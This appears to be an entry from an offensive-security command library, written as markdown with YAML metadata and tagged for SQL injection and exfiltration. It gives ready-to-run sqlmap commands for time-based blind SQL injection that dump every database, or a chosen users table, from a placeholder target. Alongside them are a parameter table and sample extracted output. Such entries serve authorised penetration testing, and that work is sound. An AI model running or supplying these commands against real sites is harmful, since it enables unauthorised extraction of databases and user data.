---
data: >-
  sqlmap -u "http://target.com/vulnerable/path" --technique=T --dbms=mysql
  --batch --dump-all
tags:
  - sqli
  - automation
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
id: d86daaa0-ccc4-4972-8932-9e0f4b674fbc
created_at: '2025-12-14T17:26:17.726Z'
updated_at: '2025-12-14T17:26:17.726Z'
verified: false
validated: true
submitted: true
---
# sqlmap-time-based-extraction

## Command

```bash
sqlmap -u "http://target.com/vulnerable/path" --technique=T --dbms=mysql --batch --dump-all
```

## Description

This command uses sqlmap to perform time-based blind SQL injection attacks on a vulnerable URI path, automating the inference and dumping of database contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u "http://target.com/vulnerable/path"` | Target URL with injection point | Yes |
| `--technique=T` | Use time-based blind SQL injection | Yes |
| `--dbms=mysql` | Specify the database management system | Yes |
| `--batch` | Non-interactive mode, accept defaults | No |
| `--dump-all` | Dump all databases, tables, and data | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u "http://target.com/vulnerable/path" --technique=T --dbms=mysql --dump
```

### Advanced Usage

```bash
sqlmap -u "http://target.com/vulnerable/path" --technique=T --dbms=mysql --level=3 --risk=2 --dump -D specific_db -T users
```

## Expected Output

Sqlmap outputs enumerated data progressively, such as database names, table structures, and row contents inferred via timing (e.g., 'Database: mars_db
Table: users
[1 entry]
+----+----------+
| id | username |
+----+----------+
| 1  | admin    |
+----+----------+').

## Related

- [[Related Procedure|procedures/Exploit-Time-Based-Blind-SQL-Injection]]
